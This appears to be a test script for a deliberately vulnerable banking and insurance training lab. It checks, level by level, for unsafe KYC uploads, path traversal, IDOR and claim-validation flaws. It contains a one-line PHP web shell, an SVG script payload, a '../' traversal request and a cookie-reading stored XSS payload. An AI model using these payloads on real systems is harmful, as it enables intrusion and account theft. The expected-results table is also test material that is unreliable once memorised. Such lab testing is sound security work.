"""KYC uploads, downloads, insurance claims and support tickets.

Covers the file-handling and claim/ticket modules: extension handling and
plaintext upload names, unauthenticated-by-ownership downloads, directory
traversal, claim amount and policy-ownership checks, and stored XSS plus
internal-note leakage in the ticket system.
"""

import io
import sys

from harness import (CUSTOMER, ADMIN, csrf, execute, lab, login, parse_levels,
                     rows, run_module, text)

TITLE = "uploads, claims, tickets - KYC, traversal, stored XSS"

EXPECT = {
    "login":                        (302, 302, 302, 302),
    "kyc_page":                     (200, 200, 200, 200),
    # upload handling: names kept verbatim, dangerous extensions accepted
    "kyc_stored_name_verbatim":     (True, True, False, False),
    "svg_accepted":                 (True, True, False, False),
    "php_accepted":                 (True, False, False, False),
    "phtml_accepted":               (True, True, False, False),
    # downloads are not scoped to the owner until `hard`
    "kyc_download_status":          (200, 200, 403, 403),
    "traversal_status":             (200, 200, 403, 403),
    "traversal_leaks_db":           (True, True, False, False),
    # the legacy decoy file is reachable on every level by design
    "legacy_flag_file":             (True, True, True, True),
    # claims: validation, ownership, cumulative limit, note visibility
    "claim_negative_status":        (302, 302, 400, 400),
    "claim_over_coverage_status":   (302, 302, 400, 400),
    "claim_cumulative_allowed":     (True, True, True, False),
    "claim_foreign_policy_status":  (302, 302, 403, 403),
    "claim_own_note_visible":       (True, True, True, False),
    "claim_idor_status":            (200, 200, 403, 403),
    "claim_idor_leaks_number":      (True, True, False, False),
    "claim_attachment_flag":        (True, True, False, False),
    # tickets: stored XSS, internal notes, ownership
    "ticket_xss_unescaped":         (True, True, False, False),
    "customer_can_set_internal":    (True, True, True, False),
    "ticket_idor_status":           (200, 200, 403, 403),
    "ticket_idor_leaks_subject":    (True, True, False, False),
    "ticket_idor_comment_status":   (302, 302, 403, 403),
    "admin_support_page":           (200, 200, 200, 200),
    "own_ticket_show_internal":     (True, True, True, False),
}

PDF = b"%PDF-1.4\n% lab placeholder\n"
SVG = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'


def run(level):
    out = {}
    with lab(level) as (app, db_path, _uploads, _tmp):
        client = app.test_client()
        out["login"] = login(client).status_code
        me = rows(db_path, "SELECT id FROM users WHERE username=?", (CUSTOMER[0],))[0]["id"]

        # ---------------- KYC upload ---------------------------------------
        out["kyc_page"] = client.get("/kyc/upload").status_code
        token = csrf(client, "/kyc/upload")

        def upload(name, payload, doc_type="lainnya"):
            resp = client.post("/kyc/upload",
                               data={"csrf_token": token, "doc_type": doc_type,
                                     "document": (io.BytesIO(payload), name)},
                               content_type="multipart/form-data",
                               follow_redirects=False)
            latest = rows(db_path, "SELECT stored_name FROM kyc_documents "
                                   "WHERE user_id=? ORDER BY id DESC LIMIT 1", (me,))[0]
            return resp.status_code, latest["stored_name"]

        _status, stored = upload("ktp.pdf", PDF, "ktp")
        out["kyc_stored_name_verbatim"] = stored == "ktp.pdf"

        out["svg_accepted"] = upload("evil.svg", SVG, "selfie")[1] == "evil.svg"
        out["php_accepted"] = upload("shell.pdf.php", b"<?php system($_GET[0]); ?>")[1] \
            == "shell.pdf.php"
        out["phtml_accepted"] = upload("shell.phtml", b"<?php echo 1; ?>")[1] == "shell.phtml"

        # ---------------- KYC IDOR -----------------------------------------
        foreign_doc = rows(db_path, "SELECT id FROM kyc_documents WHERE user_id != ? "
                                    "ORDER BY id LIMIT 1", (me,))[0]
        out["kyc_download_status"] = client.get(
            f"/kyc/download/{foreign_doc['id']}").status_code

        # ---------------- path traversal ------------------------------------
        # The throwaway DB sits one level above the upload root.
        escape = "../" + db_path.replace("\\", "/").rsplit("/", 1)[-1]
        traversed = client.get("/uploads/" + escape)
        out["traversal_status"] = traversed.status_code
        out["traversal_leaks_db"] = b"SQLite format" in traversed.data
        out["legacy_flag_file"] = b"FLAG{" in client.get("/uploads/legacy/flag.txt").data

        # ---------------- insurance claims ----------------------------------
        assert client.get("/insurance").status_code == 200
        my_policy = rows(db_path, "SELECT * FROM insurance_policies WHERE user_id=?", (me,))
        foreign_policy = rows(db_path, "SELECT * FROM insurance_policies "
                                       "WHERE user_id != ? ORDER BY id", (me,))[0]
        token = csrf(client, "/insurance/claim")
        policy = my_policy[0]

        def claim(amount, policy_id=None, description="claim", **extra):
            data = {"csrf_token": token, "policy_id": policy_id or policy["id"],
                    "amount": str(amount), "description": description, **extra}
            return client.post("/insurance/claim", data=data,
                               follow_redirects=False).status_code

        out["claim_negative_status"] = claim(-5000000, description="negative claim")
        out["claim_over_coverage_status"] = claim(
            policy["coverage"] * 5, description="over coverage")

        # Cumulative bypass: several claims that each pass on their own.
        for _ in range(3):
            claim(policy["coverage"], description="cumulative")
        total = rows(db_path, "SELECT SUM(amount) AS t FROM claims WHERE policy_id=? "
                              "AND status='submitted' AND description='cumulative'",
                     (policy["id"],))[0]["t"] or 0
        out["claim_cumulative_allowed"] = total > policy["coverage"]

        out["claim_foreign_policy_status"] = claim(1000000, foreign_policy["id"],
                                                   description="foreign policy")

        own_claim = rows(db_path, "SELECT id FROM claims WHERE user_id=? "
                                  "ORDER BY id DESC LIMIT 1", (me,))[0]["id"]
        execute(db_path, "UPDATE claims SET admin_note='Internal: lampiran kurang, "
                         "curigai pemalsuan.' WHERE id=?", (own_claim,))
        own_view = text(client.get(f"/insurance/claim/{own_claim}"))
        out["claim_own_note_visible"] = "catatan admin" in own_view.lower()

        foreign_claim = rows(db_path, "SELECT * FROM claims WHERE user_id != ? "
                                      "ORDER BY id LIMIT 1", (me,))[0]
        foreign_view = client.get(f"/insurance/claim/{foreign_claim['id']}")
        out["claim_idor_status"] = foreign_view.status_code
        out["claim_idor_leaks_number"] = foreign_claim["claim_no"].encode() in foreign_view.data
        out["claim_attachment_flag"] = b"FLAG{" in client.get(
            f"/insurance/claim/{foreign_claim['id']}/attachment").data

        # ---------------- support tickets -----------------------------------
        assert client.get("/support").status_code == 200
        token = csrf(client, "/support/new")
        payload = "<img src=x onerror=alert(document.cookie)>"
        client.post("/support/new",
                    data={"csrf_token": token, "subject": "XSS " + payload,
                          "body": payload, "category": "teknis", "priority": "high"},
                    follow_redirects=False)
        ticket = rows(db_path, "SELECT * FROM tickets WHERE user_id=? "
                               "ORDER BY id DESC LIMIT 1", (me,))[0]
        out["ticket_xss_unescaped"] = payload.encode() in client.get(
            f"/support/{ticket['id']}").data

        token = csrf(client, f"/support/{ticket['id']}")
        client.post(f"/support/{ticket['id']}/comment",
                    data={"csrf_token": token, "body": "internal note",
                          "is_internal": "1"}, follow_redirects=False)
        out["customer_can_set_internal"] = rows(
            db_path, "SELECT is_internal FROM ticket_comments WHERE ticket_id=? "
                     "ORDER BY id DESC LIMIT 1", (ticket["id"],))[0]["is_internal"] == 1

        foreign_ticket = rows(db_path, "SELECT * FROM tickets WHERE user_id != ? "
                                       "ORDER BY id LIMIT 1", (me,))[0]
        foreign_view = client.get(f"/support/{foreign_ticket['id']}")
        out["ticket_idor_status"] = foreign_view.status_code
        out["ticket_idor_leaks_subject"] = foreign_ticket["subject"].encode() in foreign_view.data
        out["ticket_idor_comment_status"] = client.post(
            f"/support/{foreign_ticket['id']}/comment",
            data={"csrf_token": token, "body": "hijack"},
            follow_redirects=False).status_code

        # ---------------- an admin can triage the same ticket ---------------
        admin = app.test_client()
        login(admin, *ADMIN)
        out["admin_support_page"] = admin.get("/support").status_code
        admin.post(f"/support/{ticket['id']}/comment",
                   data={"csrf_token": csrf(admin, f"/support/{ticket['id']}"),
                         "body": "Status: diproses", "is_internal": "1"},
                   follow_redirects=False)
        out["own_ticket_show_internal"] = \
            b"catatan internal" in client.get(f"/support/{ticket['id']}").data
    return out


if __name__ == "__main__":
    sys.exit(run_module(TITLE, run, EXPECT, parse_levels()))
